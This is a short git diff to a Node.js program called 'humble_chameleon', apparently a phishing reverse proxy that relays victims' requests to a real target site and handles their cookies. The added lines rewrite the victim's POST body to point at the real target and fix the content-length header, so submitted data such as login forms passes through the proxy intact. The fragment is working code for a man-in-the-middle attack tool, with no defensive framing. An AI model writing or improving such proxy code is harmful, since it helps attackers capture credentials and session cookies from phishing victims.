@@ -127,6 +127,8 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
   //wait for the end of the request to begin the proxy steps
   victim_request.on('end', function () {
 
+    postData = postData.replace(reverse_sub_regex, target)
+
     options = {
       host: victim_request.headers.host.replace(humble_domain, target),
       port: 443,
@@ -135,6 +137,8 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
       //wierd but it works somehow... Just the string will break a bunch of stuff
       headers: JSON.parse(JSON.stringify(victim_request.headers).replace(reverse_sub_regex, target))
     };
+
+    options.headers['content-length'] = postData.length.toString()
 
     let victim_cookies = options.headers.cookie;
     if((typeof victim_cookies) == 'undefined'){
